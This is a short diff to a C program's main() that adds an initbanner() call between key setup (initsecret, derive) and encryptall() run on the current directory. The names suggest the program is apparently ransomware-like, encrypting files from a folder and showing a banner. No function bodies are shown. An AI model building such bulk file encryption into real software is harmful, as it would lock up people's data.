@@ -7,6 +7,7 @@
 int main() {
   initsecret();
   derive();
+  initbanner();
 
   char path[PATH_MAX] = ".";
   encryptall(path);
